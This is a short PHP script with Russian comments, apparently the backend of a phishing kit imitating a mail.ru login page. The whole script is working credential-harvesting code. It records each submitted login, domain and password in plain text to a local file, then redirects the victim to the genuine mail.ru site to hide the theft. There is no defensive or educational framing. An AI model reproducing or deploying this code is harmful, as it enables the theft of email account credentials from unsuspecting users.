<?php
###############  LOGIN.PHP ##############################################
# Скрипт записывает в файл $db данные в формате                         #
# Логин@домен | пароль                                                  #
# Скрипт создан каналом K1ZON TV http://www.youtube.com/user/DenVeyron  #
#########################################################################

$db="k1zon-tv.txt";
$realmail="https://mail.ru/"; 
$index = "index.php";

if (isset($_POST['Login']) && isset($_POST['Domain']) && isset($_POST['Password']) && ($_POST['Login']!="") && ($_POST['Domain']!="") && ($_POST['Password']!=""))
{
$login=$_POST['Login'];
$password=$_POST['Password'];
$domain=$_POST['Domain'];
$str="Login[$login@$domain]|| Password [$password] \n";
$file=fopen("$db","a+");
if(!$file)
{
header("Location: $realmail"); 
}
else
{
fputs($file, $str);
header("Location: $realmail"); 
}
}
else
{
header("Location: $index"); 
}
?>